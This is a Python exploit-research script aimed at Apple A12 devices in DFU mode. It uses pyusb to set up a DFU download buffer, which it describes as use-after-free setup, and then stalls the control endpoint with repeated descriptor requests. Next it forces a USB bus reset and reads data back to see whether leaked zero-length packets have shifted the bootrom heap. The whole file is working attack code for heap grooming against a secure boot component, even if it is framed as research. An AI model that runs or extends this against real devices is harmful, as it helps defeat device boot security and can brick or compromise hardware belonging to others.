#!/usr/bin/env python3
"""
A12 USB RESET ZLP Leak Test
============================
Tests the discovery from A12_DOUBLE_ABORT_ANALYSIS.md:
  - dwc3_usb_reset (C448) does NOT have a double-abort
  - ZLPs created during abort callbacks are orphaned by bzero at C4A4
  - This means ZLPs LEAK on the USB RESET path!

Strategy:
  1. Connect to device in DFU
  2. Stall EP0_IN by sending many GET_DESCRIPTOR requests with wLength > actual  
  3. Trigger USB BUS RESET (not DFU abort)
  4. Reconnect and check if heap is perturbed (io_buffer at different address)
  5. Repeat with increasing stall counts to accumulate ZLP leaks

The ZLP trigger condition (standard_device_request_cb at D3D0):
  io_length > 0 && io_length % 64 == 0 && wLength > io_length

We need a request that returns exactly 64 bytes. The serial string descriptor
might work if it's exactly 64 bytes, or we can use GET_DESCRIPTOR for string
index with carefully chosen wLength.
"""
import sys, time, struct, json
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC
DFU_PID = 0x1227

def get_backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def connect():
    dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=get_backend())
    if dev:
        try:
            dev.set_configuration()
        except:
            pass
    return dev

def get_status(dev):
    try:
        r = dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bState": r[4], "poll_ms": r[1]|(r[2]<<8)|(r[3]<<16)}
    except:
        return None

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}", flush=True)

def reset_to_idle(dev):
    """Try to get device back to dfuIDLE (state 2)."""
    for _ in range(10):
        st = get_status(dev)
        if not st:
            return False
        if st["bState"] == 2:
            return True
        if st["bState"] == 10:  # dfuERROR
            dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)  # DFU_CLR_STATUS
        else:
            try:
                dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)  # DFU_ABORT
            except:
                return False
        time.sleep(0.1)
    return False

def probe_zlp_descriptors(dev):
    """Find which descriptors return lengths that are multiples of 64."""
    log("Probing descriptor lengths for ZLP candidates...")
    zlp_candidates = []
    
    # Try all string descriptor indices (0-10)
    for idx in range(11):
        for langid in [0x0409, 0x0000]:
            try:
                r = dev.ctrl_transfer(0x80, 6, 0x0300 | idx, langid, 255, timeout=500)
                rlen = len(r)
                is_mod64 = (rlen > 0 and rlen % 64 == 0)
                marker = " <<<< ZLP CANDIDATE!" if is_mod64 else ""
                log(f"  String[{idx}] lang=0x{langid:04X}: {rlen} bytes (mod64={rlen%64}){marker}")
                if is_mod64:
                    zlp_candidates.append(("string", idx, langid, rlen))
            except:
                pass
    
    # Try device qualifier (might not exist for USB 2.0 full-speed)
    try:
        r = dev.ctrl_transfer(0x80, 6, 0x0600, 0, 255, timeout=500)
        rlen = len(r)
        is_mod64 = (rlen > 0 and rlen % 64 == 0)
        log(f"  DeviceQualifier: {rlen} bytes (mod64={rlen%64})")
        if is_mod64:
            zlp_candidates.append(("devqual", 0, 0, rlen))
    except:
        log("  DeviceQualifier: not supported")
    
    return zlp_candidates

def stall_ep0in(dev, count, wLength=192):
    """
    Send many GET_DESCRIPTOR requests rapidly without reading responses.
    This creates pending io_requests on EP0_IN.
    Using async/non-blocking approach to stall.
    """
    log(f"Stalling EP0_IN with {count} requests (wLength={wLength})...")
    sent = 0
    for i in range(count):
        try:
            # GET_DESCRIPTOR for device descriptor, ask for more than actual (18 bytes)
            # The device will prepare a response and queue it on EP0_IN
            dev.ctrl_transfer(0x80, 6, 0x0100, 0, wLength, timeout=200)
            sent += 1
        except usb.core.USBTimeoutError:
            sent += 1  # Request was sent, just timed out waiting for response
        except Exception as e:
            log(f"  Request {i} failed: {e}")
            break
    log(f"  Sent {sent}/{count} requests")
    return sent

def trigger_usb_reset(dev):
    """Trigger a USB bus reset. This goes through dwc3_usb_reset (C448), NOT dwc3_core_stop."""
    log("Triggering USB BUS RESET...")
    try:
        dev.reset()
        log("  USB reset sent")
        return True
    except Exception as e:
        log(f"  Reset error: {e}")
        return False

def run_zlp_leak_test(stall_count=10):
    """
    Main test: stall EP0_IN, trigger USB reset, check heap state.
    """
    log(f"\n{'='*60}")
    log(f"ZLP LEAK TEST — stall_count={stall_count}")
    log(f"{'='*60}")
    
    # Connect
    dev = connect()
    if not dev:
        log("ERROR: No DFU device found!")
        return None
    
    st = get_status(dev)
    log(f"Initial state: {st}")
    
    # Reset to idle if needed
    if st and st["bState"] != 2:
        if not reset_to_idle(dev):
            log("Could not reset to idle, reconnecting...")
            time.sleep(2)
            dev = connect()
            if not dev:
                log("Lost device!")
                return None
            st = get_status(dev)
            log(f"After reconnect: {st}")
    
    # Phase 1: Probe ZLP candidates
    zlp_cands = probe_zlp_descriptors(dev)
    log(f"ZLP candidates found: {len(zlp_cands)}")
    
    # Phase 2: Send DFU_DNLOAD to setup ep0DataPhaseBuffer (part of UAF setup)
    log("Sending DFU_DNLOAD (512 bytes) to setup ep0DataPhaseBuffer...")
    try:
        payload = bytes([0x41] * 512)
        dev.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=5000)
        st = get_status(dev)
        log(f"  After DNLOAD: state={st}")
    except Exception as e:
        log(f"  DNLOAD error: {e}")
    
    # Phase 3: Stall EP0_IN with many requests
    # These create io_requests with standard_device_request_cb callbacks
    sent = stall_ep0in(dev, stall_count)
    
    # Phase 4: Trigger USB BUS RESET (not DFU abort!)
    # This goes through dwc3_usb_reset (C448) which does NOT have double-abort
    # ZLPs allocated during abort callbacks should be orphaned by the bzero at C4A4
    trigger_usb_reset(dev)
    
    # Phase 5: Wait for device to re-enumerate
    log("Waiting for device re-enumeration...")
    time.sleep(2)
    
    dev2 = connect()
    if not dev2:
        log("Device did not re-enumerate after USB reset!")
        # Try longer wait
        for i in range(5):
            time.sleep(1)
            dev2 = connect()
            if dev2:
                break
    
    if not dev2:
        log("Device lost after USB reset!")
        return {"stall_count": stall_count, "result": "device_lost"}
    
    st2 = get_status(dev2)
    log(f"After USB reset: state={st2}")
    
    # Phase 6: Now test if heap is perturbed
    # Send another DNLOAD — if the heap changed, this buffer may be at a different address
    log("Sending post-reset DNLOAD (512 bytes)...")
    try:
        # First reset to idle
        reset_to_idle(dev2)
        
        payload2 = bytes([0x42] * 512)
        dev2.ctrl_transfer(0x21, 1, 0, 0, payload2, timeout=5000)
        st3 = get_status(dev2)
        log(f"  After post-reset DNLOAD: state={st3}")
    except Exception as e:
        log(f"  Post-reset DNLOAD error: {e}")
    
    # Phase 7: Try DFU_UPLOAD to read back — if heap moved, we might read stale data
    log("Attempting DFU_UPLOAD (read back)...")
    try:
        data = dev2.ctrl_transfer(0xA1, 2, 0, 0, 512, timeout=2000)
        nonzero = sum(1 for b in data if b != 0)
        unique = len(set(data))
        log(f"  UPLOAD got {len(data)} bytes, {nonzero} non-zero, {unique} unique values")
        log(f"  First 32: {' '.join(f'{b:02X}' for b in data[:32])}")
        log(f"  Last 32:  {' '.join(f'{b:02X}' for b in data[-32:])}")
        
        # Check if we got our original 0x41 pattern (stale data = heap not moved)
        # or 0x42 pattern (current data = heap at same place)
        # or something else (corruption = interesting!)
        count_41 = sum(1 for b in data if b == 0x41)
        count_42 = sum(1 for b in data if b == 0x42)
        count_00 = sum(1 for b in data if b == 0x00)
        log(f"  Pattern: 0x41={count_41}, 0x42={count_42}, 0x00={count_00}")
        
        if count_41 > 256:
            log("  >>> STALE DATA DETECTED! Heap may have moved! <<<")
        elif count_42 > 256:
            log("  >>> Current data — heap at same location (no leak effect)")
        else:
            log("  >>> Unexpected data — possible corruption or different behavior")
        
        return {
            "stall_count": stall_count,
            "sent": sent,
            "result": "success",
            "upload_len": len(data),
            "count_41": count_41,
            "count_42": count_42,
            "count_00": count_00,
            "first_32": data[:32].hex(),
            "last_32": data[-32:].hex(),
        }
    except Exception as e:
        log(f"  UPLOAD error: {e}")
        return {"stall_count": stall_count, "sent": sent, "result": f"upload_error: {e}"}

if __name__ == "__main__":
    results = []
    # Test with increasing stall counts
    for count in [5, 10, 20, 50]:
        r = run_zlp_leak_test(count)
        results.append(r)
        if r and r.get("result") == "device_lost":
            log("Device lost, waiting for DFU re-entry...")
            time.sleep(5)
        else:
            time.sleep(1)
    
    # Save results
    out = Path(__file__).parent / "results" / "zlp_leak_test.json"
    out.parent.mkdir(exist_ok=True)
    with open(out, "w") as f:
        json.dump({"timestamp": datetime.now().isoformat(), "results": results}, f, indent=2)
    log(f"\nResults saved to {out}")
